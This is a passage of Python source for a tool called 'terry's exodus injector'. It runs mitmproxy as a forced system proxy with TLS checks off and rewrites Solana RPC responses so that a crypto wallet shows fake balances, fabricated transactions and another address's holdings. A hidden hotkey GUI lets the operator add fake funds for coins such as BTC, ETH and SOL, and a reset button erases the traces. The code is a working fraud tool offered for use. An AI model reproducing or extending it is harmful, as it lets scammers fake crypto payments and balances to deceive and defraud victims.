                                            v = tx.get(k)
                                            if v and isinstance(v, str) and requested_address and v == requested_address:
                                                addr_match = True
                                                break
                                        if requested_address and not addr_match:
                                            continue
                                        if 'lamports' in tx:
                                            lam = int(tx.get('lamports'))
                                        else:
                                            lam = int(round(float(tx.get('amount', 0)) * 1_000_000_000))
                                        total_lam += lam
                                    except Exception:
                                        continue
                                # override numeric balance with total injected lamports
                                if total_lam > 0:
                                    resp_json['result'] = int(total_lam)
                                    modified_content = json.dumps(resp_json)
                        # getAccountInfo
                        elif isinstance(resp_json['result'], dict):
                            val = resp_json['result'].get('value')
                            # If upstream returned a full account dict with lamports, adjust it
                            if isinstance(val, dict) and 'lamports' in val:
                                injected_txs = load_injected_transactions('SOL', flow)
                                if injected_txs:
                                    for tx in injected_txs:
                                        try:
                                            if requested_address and tx.get('address') != requested_address:
                                                continue
                                            lam = int(tx.get('lamports')) if 'lamports' in tx else int(float(tx.get('amount', 0)) * 1_000_000_000)
                                            creation_ts = float(tx.get('creation_timestamp', time.time()))
                                            confirm_seconds = float(tx.get('confirm_seconds', 600))
                                            confirm_seconds = max(confirm_seconds, 1.0)
                                            elapsed = time.time() - creation_ts
                                            step = confirm_seconds / 6.0
                                            if elapsed < step:
                                                added_for_tx = 0
                                            else:
                                                confirmations = int(elapsed // step)
                                                confirmations = min(confirmations, 6)
                                                added_for_tx = int(lam * (confirmations / 6.0))
                                            if added_for_tx > 0:
                                                added += added_for_tx
                                        except Exception:
                                            continue
                                    if added > 0:
                                        val['lamports'] = int(val.get('lamports', 0)) + added
                                        if 'data' not in val or not val['data']:
                                            val['data'] = ["", "base64"]
                                        resp_json['result']['value'] = val
                                        modified_content = json.dumps(resp_json)
                            # Always override getAccountInfo results for the requested address
                            elif True:
                                # If this is a getAccountInfo request for our requested_address, replace value
                                try:
                                    if method and method == 'getAccountInfo' and requested_address:
                                        injected_txs = load_injected_transactions('SOL', flow)
                                        total_lam = 0
                                        if injected_txs:
                                            for tx in injected_txs:
                                                try:
                                                    addr_match = False
                                                    for k in ('address', 'your_address', 'rich_address'):
                                                        v = tx.get(k)
                                                        if v and isinstance(v, str) and requested_address and v == requested_address:
                                                            addr_match = True
                                                            break
                                                    if requested_address and not addr_match:
                                                        continue
                                                    if 'lamports' in tx:
                                                        lam = int(tx.get('lamports'))
                                                    else:
                                                        lam = int(round(float(tx.get('amount', 0)) * 1_000_000_000))
                                                    total_lam += lam
                                                except Exception:
                                                    continue
                                        if total_lam > 0:
                                            synthesized = {
                                                'lamports': int(total_lam),
                                                'data': ["", "base64"],
                                                'owner': '11111111111111111111111111111111',
                                                'executable': False,
                                                'rentEpoch': 18446744073709551615,
                                                'space': 0
                                            }
                                            resp_json['result']['value'] = synthesized
                                            modified_content = json.dumps(resp_json)
                                except Exception:
                                    pass
                except Exception:
                    pass
                try:
                    _m_end = rq_fake.get('method') if isinstance(rq_fake, dict) else None
                    if _m_end == 'getTransaction' and isinstance(resp_json, dict):
                        _params = rq_fake.get('params') or [] if isinstance(rq_fake, dict) else []
                        _sigp = _params[0] if _params else None
                        if (
                            isinstance(_sigp, str)
                            and _sigp in sol_user_broadcast_sigs
                            and resp_json.get('result') is None
                        ):
                            resp_json['result'] = create_fake_sol_transaction(
                                {
                                    'address': '11111111111111111111111111111111',
                                    'your_address': '11111111111111111111111111111111',
                                    'amount': 0,
                                    'lamports': 0,
                                    'sender': '11111111111111111111111111111111',
                                },
                                creation_time=float(sol_user_broadcast_sigs.get(_sigp, time.time())),
                                override_signature=_sigp,
                            )
                            modified_content = json.dumps(resp_json)
                except Exception:
                    pass
                # perform rich->your_address replacement if mappings exist
                for mapping in sol_address_mappings:
                    your_addr = mapping.get('your_address')
                    rich_addr = mapping.get('rich_address')
                    if your_addr and rich_addr:
                        modified_content = modified_content.replace(rich_addr, your_addr)
                if modified_content != content:
                    flow.response.content = modified_content.encode('utf-8')
                    print(f"sol watch wallet imported")
            except Exception:
                pass
except Exception:
    # If something fails here at import-time, don't break mitmdump; mitmdump will catch errors
    pass

# ------------------------
# CLI / GUI launcher (only when run directly)
# ------------------------
if __name__ == '__main__':
    import sys
    import threading
    import subprocess
    import ctypes
    import shutil
    import socket

    # GUI and tray imports
    try:
        import tkinter as tk
        from tkinter import simpledialog, messagebox, ttk
        from PIL import Image, ImageDraw, ImageTk
        import pystray
        import keyboard
    except Exception as e:
        print("Missing GUI dependencies. Install requirements.txt and try again.")
        print(e)
        sys.exit(1)

    APP_PATH = os.path.abspath(__file__)

    # In-memory transactions served to mitmdump via a tiny local HTTP
    # server while the GUI is running. This avoids writing to disk.

    # In-memory transactions served to mitmdump via a tiny local HTTP
    # server while the GUI is running. This avoids writing to disk.
    # Use a thread-safe store and normalize transactions on insert.
    gui_transactions = []
    gui_transactions_lock = threading.Lock()
    injector_reset_epoch = 0

    def normalize_transaction(tx: dict) -> dict:
        try:
            t = dict(tx)
            t['crypto'] = (t.get('crypto') or '').upper()
            # timestamps
            if 'creation_timestamp' not in t:
                t['creation_timestamp'] = time.time()
            t['time'] = t.get('time') or time.ctime()
            # default sender
            if 'sender' not in t:
                # for SOL produce a realistic-looking pubkey; keep previous behaviour for others
                if t.get('crypto') == 'SOL':
                    try:
                        t['sender'] = _make_sol_pubkey(t.get('_consistent_id') or t.get('address') or t.get('your_address'))
                    except Exception:
                        t['sender'] = 'Random'
                else:
                    t['sender'] = 'Random'
            # amounts numeric
            if 'amount' in t:
                try:
                    t['amount'] = float(t['amount'])
                except Exception:
                    t['amount'] = 0.0
            # Lowercase hex/account addresses only for account-based chains (ETH/BNB/USDT)
            if t.get('crypto') in ('ETH', 'BNB', 'USDT'):
                if 'address' in t and isinstance(t.get('address'), str):
                    t['address'] = t['address'].lower()
                if 'your_address' in t and isinstance(t.get('your_address'), str):
                    t['your_address'] = t['your_address'].lower()
                if 'rich_address' in t and isinstance(t.get('rich_address'), str):
                    t['rich_address'] = t['rich_address'].lower()
            return t
        except Exception:
            return tx

    def add_injected_transaction(tx: dict):
        try:
            t = normalize_transaction(tx)
            with gui_transactions_lock:
                gui_transactions.append(t)
            if dev_mode:
                app_log(f"[INJECTOR] added tx: {t}")
            return True
        except Exception as e:
            if dev_mode:
                app_log(f"[INJECTOR] add tx error: {e}")
            return False

    def list_injected_transactions():
        try:
            with gui_transactions_lock:
                return [dict(x) for x in gui_transactions]
        except Exception:
            return []

    def clear_injected_transactions():
        """Clear in-memory injector state, persisted JSON, and any fake balance / tx injection."""
        global injector_reset_epoch
        try:
            with gui_transactions_lock:
                gui_transactions.clear()
                injector_reset_epoch += 1
        except Exception:
            pass
        try:
            if os.path.exists('injected_crypto.json'):
                os.remove('injected_crypto.json')
        except Exception:
            pass
        if dev_mode:
            try:
                app_log("[INJECTOR] cleared all injected data (memory + injected_crypto.json)")
            except Exception:
                pass
    injector_server = None
    injector_port = None

    # Print small header and define app logging for visible coin actions only
    def app_log(msg: str):
        try:
            print(msg)  
        except Exception:
            pass

    app_log('==========================================')
    app_log('-       terrys exodus injector           -')
    app_log('==========================================')

    # Development/verbose mode if started with --dev (set after app_log exists)
    dev_mode = '--dev' in sys.argv[1:]
    if dev_mode:
        app_log('Starting in DEV mode: verbose logging enabled')

    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False

    def run_as_admin():
        params = ' '.join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, f'"{APP_PATH}" {params}', None, 1)

    # If not admin, relaunch requesting elevation
    if not is_admin():
        print("Requesting elevation...")
        run_as_admin()
        sys.exit(0)

    # WinINET (per-user) only — we intentionally do NOT set WinHTTP via netsh; that
    # forces many system services through mitm and breaks the network if mitm stops.
    _proxy_state = {'mitm': False}

    def enable_windows_proxy(host='127.0.0.1', port=8080):
        try:
            import winreg
            proxy = f"{host}:{port}"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'ProxyEnable', 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, 'ProxyServer', 0, winreg.REG_SZ, proxy)
            winreg.CloseKey(key)
            INTERNET_OPTION_SETTINGS_CHANGED = 39
            INTERNET_OPTION_REFRESH = 37
            ctypes.windll.Wininet.InternetSetOptionW(0, INTERNET_OPTION_SETTINGS_CHANGED, 0, 0)
            ctypes.windll.Wininet.InternetSetOptionW(0, INTERNET_OPTION_REFRESH, 0, 0)
            _proxy_state['mitm'] = True
            if dev_mode:
                app_log(f"Windows proxy enabled -> {proxy}")
        except Exception as e:
            if dev_mode:
                app_log(f"enable_windows_proxy error: {e}")
            pass

    def disable_windows_proxy():
        _proxy_state['mitm'] = False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'ProxyEnable', 0, winreg.REG_DWORD, 0)
            try:
                winreg.DeleteValue(key, 'ProxyServer')
            except Exception:
                pass
            winreg.CloseKey(key)
            INTERNET_OPTION_SETTINGS_CHANGED = 39
            INTERNET_OPTION_REFRESH = 37
            ctypes.windll.Wininet.InternetSetOptionW(0, INTERNET_OPTION_SETTINGS_CHANGED, 0, 0)
            ctypes.windll.Wininet.InternetSetOptionW(0, INTERNET_OPTION_REFRESH, 0, 0)
            try:
                if dev_mode:
                    app_log("Resetting winhttp proxy")
                    subprocess.run(['netsh', 'winhttp', 'reset', 'proxy'], check=False)
                else:
                    subprocess.run(['netsh', 'winhttp', 'reset', 'proxy'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
            if dev_mode:
                app_log("Windows proxy disabled")
        except Exception as e:
            if dev_mode:
                app_log(f"disable_windows_proxy error: {e}")
            pass

    def _wait_for_tcp_listen(host, port, timeout_sec=25.0):
        """Return True once `host:port` accepts connections and mitmdump is still running."""
        deadline = time.time() + timeout_sec
        while time.time() < deadline:
            try:
                if mitmdump_proc is not None and mitmdump_proc.poll() is not None:
                    return False
            except Exception:
                pass
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                try:
                    if s.connect_ex((host, port)) == 0:
                        try:
                            if mitmdump_proc is not None and mitmdump_proc.poll() is not None:
                                return False
                        except Exception:
                            pass
                        return True
                finally:
                    s.close()
            except Exception:
                pass
            time.sleep(0.15)
        return False

    def _mitmdump_watchdog():
        while True:
            time.sleep(4)
            try:
                if not _proxy_state.get('mitm'):
                    continue
                p = mitmdump_proc
                if p is None:
                    continue
                if p.poll() is not None:
                    disable_windows_proxy()
                    if dev_mode:
                        app_log('mitmdump exited; Windows proxy disabled to restore internet')
            except Exception:
                pass

    # Ensure proxy is restored on exit: register atexit and signal handlers
    try:
        import atexit, signal

        def _cleanup_and_exit(signum=None, frame=None):
            try:
                disable_windows_proxy()
            except Exception:
                pass
            try:
                if 'mitmdump_proc' in globals() and mitmdump_proc and mitmdump_proc.poll() is None:
                    mitmdump_proc.terminate()
            except Exception:
                pass
            try:
                # shutdown injector server if running so mitmdump stops receiving state
                if 'injector_server' in globals() and injector_server:
                    try:
                        injector_server.shutdown()
                    except Exception:
                        pass
            except Exception:
                pass
            try:
                sys.exit(0)
            except Exception:
                pass

        atexit.register(disable_windows_proxy)
        # handle common termination signals
        try:
            signal.signal(signal.SIGINT, _cleanup_and_exit)
        except Exception:
            pass
        try:
            signal.signal(signal.SIGTERM, _cleanup_and_exit)
        except Exception:
            pass
        # Windows-specific break signal
        if hasattr(signal, 'SIGBREAK'):
            try:
                signal.signal(signal.SIGBREAK, _cleanup_and_exit)
            except Exception:
                pass
    except Exception:
        pass

    # Start mitmdump in background
    # Setup a tiny HTTP server to serve `gui_transactions` to the mitmdump
    # addon process. Bind to an ephemeral port so we don't require a
    # specific port and we don't leave persistent files on disk.
    try:
        from http.server import BaseHTTPRequestHandler, HTTPServer

        class _InjectorHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith('/state') or self.path.startswith('/transactions'):
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    with gui_transactions_lock:
                        payload = {
                            'transactions': [dict(x) for x in gui_transactions],
                            'reset_epoch': injector_reset_epoch,
                        }
                    try:
                        data = json.dumps(payload).encode('utf-8')
                        # dev logging from the GUI side so we can be sure state is served
                        try:
                            if dev_mode:
                                app_log(f"[INJECTOR] serving /state -> {len(payload.get('transactions') or [])} tx(s) epoch={payload.get('reset_epoch')} payload_size={len(data)}")
                                if len(payload.get('transactions') or []) > 0:
                                    app_log(f"[INJECTOR] sample tx: {payload['transactions'][0]}")
                        except Exception:
                            pass
                        self.wfile.write(data)
                    except Exception:
                        pass
                else:
                    self.send_response(404)
                    self.end_headers()
            def log_message(self, format, *args):
                return

        try:
            injector_server = HTTPServer(('127.0.0.1', 0), _InjectorHandler)
            injector_port = injector_server.server_address[1]
            # run server in background
            threading.Thread(target=injector_server.serve_forever, daemon=True).start()
            # export to environment so the mitmdump child can find it
            os.environ['INJECTOR_PORT'] = str(injector_port)
        except Exception:
            injector_server = None
            injector_port = None
    except Exception:
        injector_server = None
        injector_port = None

    mitmdump_path = shutil.which('mitmdump')
    mitmdump_proc = None
    if not mitmdump_path:
        app_log('mitmdump not found on PATH. Please install mitmproxy and ensure mitmdump is available.')
    else:
        mitmdump_cmd = [mitmdump_path, '--listen-port', '8080', '--ssl-insecure', '-s', APP_PATH]
        if not dev_mode:
            mitmdump_cmd.insert(3, '--quiet')
        creationflags = 0
        if os.name == 'nt' and hasattr(subprocess, 'CREATE_NO_WINDOW'):
            creationflags = subprocess.CREATE_NO_WINDOW
        env = os.environ.copy()
        if injector_port:
            env['INJECTOR_PORT'] = str(injector_port)
        try:
            if dev_mode:
                app_log(f"Launching mitmdump: {' '.join(mitmdump_cmd)}")
                try:
                    mitmdump_proc = subprocess.Popen(mitmdump_cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0)
                except Exception:
                    mitmdump_proc = subprocess.Popen(mitmdump_cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                app_log(f"mitmdump pid={getattr(mitmdump_proc, 'pid', None)} injector_port={injector_port}")

                def _stream_proc_output(p):
                    try:
                        if p.stdout is None:
                            return
                        for raw in iter(p.stdout.readline, b''):
                            try:
                                line = raw.decode('utf-8', errors='replace').rstrip('\n')
                                app_log(f"[mitmdump] {line}")
                            except Exception:
                                pass
                    except Exception:
                        pass

                threading.Thread(target=_stream_proc_output, args=(mitmdump_proc,), daemon=True).start()
            else:
                mitmdump_proc = subprocess.Popen(
                    mitmdump_cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    env=env,
                    creationflags=creationflags
                )
        except TypeError:
            if dev_mode:
                app_log(f"Launching mitmdump (fallback): {' '.join(mitmdump_cmd)}")
                try:
                    mitmdump_proc = subprocess.Popen(mitmdump_cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                except Exception:
                    mitmdump_proc = subprocess.Popen(mitmdump_cmd, env=env)
                app_log(f"mitmdump pid={getattr(mitmdump_proc, 'pid', None)} injector_port={injector_port}")

                def _stream_proc_output(p):
                    try:
                        if p.stdout is None:
                            return
                        for raw in iter(p.stdout.readline, b''):
                            try:
                                line = raw.decode('utf-8', errors='replace').rstrip('\n')
                                app_log(f"[mitmdump] {line}")
                            except Exception:
                                pass
                    except Exception:
                        pass

                threading.Thread(target=_stream_proc_output, args=(mitmdump_proc,), daemon=True).start()
            else:
                mitmdump_proc = subprocess.Popen(mitmdump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
        except Exception as e:
            app_log(f'mitmdump failed to start: {e}')
            mitmdump_proc = None

        if mitmdump_proc is not None:
            if _wait_for_tcp_listen('127.0.0.1', 8080):
                enable_windows_proxy('127.0.0.1', 8080)
            else:
                app_log('mitmdump did not listen on 127.0.0.1:8080; leaving system proxy OFF so the network keeps working')
                try:
                    mitmdump_proc.terminate()
                    mitmdump_proc.wait(timeout=5)
                except Exception:
                    try:
                        mitmdump_proc.kill()
                    except Exception:
                        pass
                mitmdump_proc = None

        threading.Thread(target=_mitmdump_watchdog, daemon=True).start()

    # Build tray icon image
    def create_image():
        # Draw a simple clover icon (four leaves + stem)
        img = Image.new('RGBA', (64, 64), (0, 0, 0, 0))
        d = ImageDraw.Draw(img)
        leaf_color = (34, 139, 34, 255)  # forest green
        stem_color = (20, 100, 20, 255)
        # four leaves as circles
        d.ellipse((18, 6, 38, 26), fill=leaf_color)
        d.ellipse((26, 14, 46, 34), fill=leaf_color)
        d.ellipse((6, 14, 26, 34), fill=leaf_color)
        d.ellipse((18, 22, 38, 42), fill=leaf_color)
        # stem
        d.rectangle((30, 36, 34, 56), fill=stem_color)
        return img

    # Tkinter UI
    root = tk.Tk()
    root.withdraw()
    popup = None

    def collect_tx_from_fields():
        global popup
        if not popup:
            return None
        try:
            crypto = popup.crypto_var.get()
        except Exception:
            return None
        your = popup.addr_entry.get().strip() if hasattr(popup, 'addr_entry') else ''
        rich = popup.rich_entry.get().strip() if hasattr(popup, 'rich_entry') else ''
        try:
            amount = float(popup.amt_entry.get()) if hasattr(popup, 'amt_entry') else 0.0
        except Exception:
            amount = 0.0
        if crypto in ('ETH', 'SOL'):
            # ETH requires wallet-watcher mapping (your + rich)
            if crypto == 'ETH':
                if not your or not rich:
                    return None
                return {'crypto': crypto, 'your_address': your, 'rich_address': rich, 'creation_timestamp': time.time(), 'time': time.ctime()}
            # SOL: allow either wallet-watcher mapping (your+rich) OR a send (address + amount)
            if crypto == 'SOL':
                # mapping if both provided
                if your and rich:
                    return {'crypto': crypto, 'your_address': your, 'rich_address': rich, 'creation_timestamp': time.time(), 'time': time.ctime()}
                # send if address + amount provided
                try:
                    if your and (amount and float(amount) > 0):
                        try:
                            sender_pk = _make_sol_pubkey()
                        except Exception:
                            sender_pk = 'Random'
                        return {'crypto': crypto, 'address': your, 'amount': amount, 'sender': sender_pk, 'creation_timestamp': time.time(), 'time': time.ctime()}
                except Exception:
                    pass
                return None
        else:
            if not your:
                return None
            return {'crypto': crypto, 'address': your, 'amount': amount, 'sender': 'Random', 'creation_timestamp': time.time(), 'time': time.ctime()}

    def hide_and_save():
        global popup
        try:
            tx = collect_tx_from_fields()
            if tx:
                # append to in-memory GUI transactions only; the mitmdump
                # addon will fetch these via the local HTTP server while
                # the GUI is running. Do not write to disk.
                try:
                    add_injected_transaction(tx)
                except Exception:
                    pass
        except Exception:
            pass
        try:
            if popup:
                popup.withdraw()
        except Exception:
            pass
        # Print a concise coin-action log (no proxy info)
        try:
            if tx:
                if tx.get('crypto') in ('ETH', 'SOL'):
                    app_log(f"{tx['crypto']} cloning: {tx.get('your_address')} to {tx.get('rich_address')}")
                else:
                    app_log(f"added {tx.get('amount')} {tx.get('crypto')} to {tx.get('address')}")
                try:
                    # also print current injector store size for clarity
                    cnt = len(list_injected_transactions())
                    app_log(f"[INJECTOR] saved -> total {cnt} tx(s) in memory")
                except Exception:
                    pass
        except Exception:
            pass

    def show_popup():
        global popup
        try:
            if popup and popup.winfo_exists():
                # toggle: if currently visible, save contents and hide; otherwise show at cursor
                try:
                    if popup.winfo_viewable():
                        # save on toggle-hide
                        hide_and_save()
                        return
                except Exception:
                    pass
                x = root.winfo_pointerx()
                y = root.winfo_pointery()
                # clear fields each time we show so content isn't preserved
                try:
                    popup.crypto_var.set('LTC')
                    popup.addr_entry.delete(0, tk.END)
                    popup.rich_entry.delete(0, tk.END)
                    popup.amt_entry.delete(0, tk.END)
                except Exception:
                    pass
                popup.geometry(f'+{x}+{y}')
                popup.deiconify()
                popup.lift()
                popup.focus_force()
                return
        except Exception:
            pass
        x = root.winfo_pointerx()
        y = root.winfo_pointery()
        popup = tk.Toplevel()
        popup.title("terry's exodus wallet")
        popup.geometry(f'600x438+{x}+{y}')
        popup.minsize(520, 380)
        bg_color = '#0f1016'
        header_bg = '#161722'
        panel_bg = '#14151c'
        fg_color = '#e8e8ed'
        label_fg = '#9898ac'
        muted_fg = '#6b6b80'
        entry_bg = '#1c1d26'
        entry_fg = '#f4f4f8'
        entry_border = '#2e3040'
        entry_focus = '#4fd1c5'
        sep_color = '#242536'
        btn_primary = '#0f766e'
        btn_primary_fg = '#f0fdf9'
        btn_secondary_bg = '#23242e'
        btn_secondary_fg = '#d4d4dc'
        btn_secondary_active = '#2e3040'
        font_ui = ('Segoe UI', 10)
        font_title = ('Segoe UI', 15)
        font_caption = ('Segoe UI', 8)

        popup.configure(bg=bg_color)
        try:
            popup.attributes('-topmost', True)
        except Exception:
            pass
        try:
            _icon_img = create_image()
            try:
                _icon_img = _icon_img.resize((32, 32), Image.LANCZOS)
            except Exception:
                _icon_img = _icon_img.resize((32, 32))
            _photo = ImageTk.PhotoImage(_icon_img)
            popup.iconphoto(False, _photo)
            popup._icon_photo = _photo
        except Exception:
            pass
        popup.protocol('WM_DELETE_WINDOW', lambda: popup.withdraw())

        style = ttk.Style(popup)
        try:
            style.theme_use('clam')
        except Exception:
            pass
        style.configure(
            'Injector.TCombobox',
            fieldbackground=entry_bg,
            background=entry_bg,
            foreground=entry_fg,
            arrowcolor=label_fg,
            bordercolor=entry_border,
            darkcolor=entry_bg,
            lightcolor=entry_bg,
            troughcolor=entry_bg,
            selectbackground='#2a3d3a',
            selectforeground=entry_fg,
            insertcolor=entry_fg,
            padding=4,
        )
        style.map(
            'Injector.TCombobox',
            fieldbackground=[('readonly', entry_bg), ('disabled', entry_bg)],
            selectbackground=[('readonly', '#2a3d3a')],
            selectforeground=[('readonly', entry_fg)],
        )

        outer = tk.Frame(popup, bg=bg_color)
        outer.pack(fill=tk.BOTH, expand=True)

        header = tk.Frame(outer, bg=header_bg, height=72)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        head_inner = tk.Frame(header, bg=header_bg)
        head_inner.pack(fill=tk.BOTH, expand=True, padx=22, pady=(18, 16))
        tk.Label(
            head_inner,
            text="terry's exodus wallet",
            font=font_title,
            bg=header_bg,
            fg=fg_color,
        ).pack(anchor=tk.W)
        tk.Label(
            head_inner,
            text='toggle with ctrl+shift+a',
            font=font_caption,
            bg=header_bg,
            fg=muted_fg,
        ).pack(anchor=tk.W, pady=(5, 0))

        body = tk.Frame(outer, bg=bg_color)

        panel = tk.Frame(body, bg=panel_bg, highlightthickness=1, highlightbackground=sep_color)
        panel.pack(fill=tk.BOTH, expand=True)
        form = tk.Frame(panel, bg=panel_bg)
        form.pack(fill=tk.BOTH, expand=True, padx=18, pady=18)
        form.columnconfigure(1, weight=1)

        def _entry_kwargs():
            return dict(
                bg=entry_bg,
                fg=entry_fg,
                insertbackground=entry_fg,
                relief=tk.FLAT,
                font=font_ui,
                bd=0,
                highlightthickness=1,
                highlightbackground=entry_border,
                highlightcolor=entry_focus,
            )

        row_pad = (0, 14)

        r = 0
        tk.Label(form, text='coin', font=font_caption, bg=panel_bg, fg=label_fg).grid(
            row=r, column=0, sticky=tk.NW, pady=row_pad, padx=(0, 16)
        )
        crypto_var = tk.StringVar(value='LTC')
        coin_cb = ttk.Combobox(
            form,
            textvariable=crypto_var,
            values=['BTC', 'LTC', 'DOGE', 'ZEC', 'BNB', 'USDT', 'XRP', 'ETH', 'SOL'],
            state='readonly',
            style='Injector.TCombobox',
            font=font_ui,
        )
        coin_cb.grid(row=r, column=1, sticky=tk.EW, pady=row_pad, ipady=4)

        r += 1
        tk.Label(form, text='original address', font=font_caption, bg=panel_bg, fg=label_fg).grid(
            row=r, column=0, sticky=tk.NW, pady=row_pad, padx=(0, 16)
        )
        addr_entry = tk.Entry(form, width=52, **_entry_kwargs())
        addr_entry.grid(row=r, column=1, sticky=tk.EW, pady=row_pad, ipady=7)

        r += 1
        tk.Label(
            form,
            text='wallet watcher · eth & sol only',
            font=font_caption,
            bg=panel_bg,
            fg=label_fg,
            justify=tk.LEFT,
        ).grid(row=r, column=0, sticky=tk.NW, pady=row_pad, padx=(0, 16))
        rich_entry = tk.Entry(form, width=52, **_entry_kwargs())
        rich_entry.grid(row=r, column=1, sticky=tk.EW, pady=row_pad, ipady=7)

        r += 1
        tk.Label(
            form,
            text='amount · not for eth',
            font=font_caption,
            bg=panel_bg,
            fg=label_fg,
            justify=tk.LEFT,
        ).grid(row=r, column=0, sticky=tk.NW, pady=row_pad, padx=(0, 16))
        amt_entry = tk.Entry(form, **_entry_kwargs())
        amt_entry.grid(row=r, column=1, sticky=tk.EW, pady=row_pad, ipady=7)

        popup.crypto_var = crypto_var
        popup.addr_entry = addr_entry
        popup.rich_entry = rich_entry
        popup.amt_entry = amt_entry

        btn_reset_bg = '#6b2f1f'
        btn_reset_fg = '#fef7f4'
        btn_reset_active = '#853a27'

        def _reset_injected_data():
            try:
                if not messagebox.askyesno(
                    'reset data',
                    'clear all injected data?\n\n'
                    'ts removes fake balances, injected history, ETH/SOL mappings, '
                    'and the saved injected_crypto.json file. the wallet will show real '
                    'chain data again after refresh.\n\n'
                    'ts cannot be undone.',
                    parent=popup,
                ):
                    return
            except Exception:
                return
            try:
                clear_injected_transactions()
            except Exception:
                pass
            try:
                crypto_var.set('LTC')
                addr_entry.delete(0, tk.END)
                rich_entry.delete(0, tk.END)
                amt_entry.delete(0, tk.END)
            except Exception:
                pass
            if dev_mode:
                try:
                    app_log('[INJECTOR] all transactions cleared from GUI')
                except Exception:
                    pass

        footer = tk.Frame(outer, bg=header_bg, highlightthickness=1, highlightbackground=sep_color)
        btn_row = tk.Frame(footer, bg=header_bg)
        btn_row.pack(fill=tk.X, padx=20, pady=14)

        def _btn(parent, **kw):
            b = tk.Button(parent, relief=tk.FLAT, font=font_ui, cursor='hand2', bd=0, **kw)
            return b

        close_btn = _btn(
            btn_row,
            text='close',
            command=lambda: popup.withdraw(),
            bg=btn_secondary_bg,
            fg=btn_secondary_fg,
            activebackground=btn_secondary_active,
            activeforeground=btn_secondary_fg,
            padx=20,
            pady=9,
        )
        close_btn.pack(side=tk.LEFT)
        reset_btn = _btn(
            btn_row,
            text='reset data',
            command=_reset_injected_data,
            bg=btn_reset_bg,
            fg=btn_reset_fg,
            activebackground=btn_reset_active,
            activeforeground=btn_reset_fg,
            padx=16,
            pady=9,
        )
        reset_btn.pack(side=tk.LEFT, padx=(10, 0))
        save_btn = _btn(
            btn_row,
            text='save',
            command=lambda: (hide_and_save(), None),
            bg=btn_primary,
            fg=btn_primary_fg,
            activebackground='#0d5c55',
            activeforeground=btn_primary_fg,
            padx=24,
            pady=9,
        )
        save_btn.pack(side=tk.RIGHT)

        footer.pack(side=tk.BOTTOM, fill=tk.X)
        body.pack(fill=tk.BOTH, expand=True, padx=20, pady=(16, 10))

    # Register global hotkey
    def on_hotkey():
        # toggle UI on Ctrl+Shift+A; schedule on GUI thread
        try:
            root.after(0, show_popup)
        except Exception:
            pass

    keyboard.add_hotkey('ctrl+shift+a', on_hotkey)

    # Create tray icon and menu
    icon = pystray.Icon('crypto_injector', create_image(), "terry's exodus wallet")
    # Ensure pystray uses our clover image (create proper size and assign)
    try:
        _img = create_image()
        try:
            _img = _img.resize((32, 32), Image.LANCZOS)
        except Exception:
            _img = _img.resize((32, 32))
        icon.icon = _img
        icon.visible = True
    except Exception:
        pass

    def on_quit(icon_, item):
        # Run cleanup in a background thread: disable proxy first, then stop mitmdump and quit
        def _quit_cleanup():
            try:
                disable_windows_proxy()
            except Exception:
                pass
            try:
                clear_injected_transactions()
            except Exception:
                pass
            # small pause to let Windows apply settings
            try:
                time.sleep(0.4)
            except Exception:
                pass
            try:
                if mitmdump_proc and mitmdump_proc.poll() is None:
                    mitmdump_proc.terminate()
            except Exception:
                pass
            try:
                if injector_server: 
                    try:
                        injector_server.shutdown()
                    except Exception:
                        pass
            except Exception:
                pass
            try:
                icon_.stop()
            except Exception:
                pass
            try:
                root.quit()
            except Exception:
                pass

        threading.Thread(target=_quit_cleanup, daemon=True).start()

    icon.menu = pystray.Menu(pystray.MenuItem('Show', lambda _: root.after(0, show_popup)), pystray.MenuItem('Quit', on_quit))

    # Run tray icon in thread
    def tray_thread():
        icon.run()

    t = threading.Thread(target=tray_thread, daemon=True)
    t.start()

    try:
        root.mainloop()
    finally:
        try:
            disable_windows_proxy()
        except Exception:
            pass
        try:
            if mitmdump_proc and mitmdump_proc.poll() is None:
                mitmdump_proc.terminate()
        except Exception:
            pass
        try:
            if injector_server:
                try:
                    injector_server.shutdown()
                except Exception:
                    pass
        except Exception:
            pass
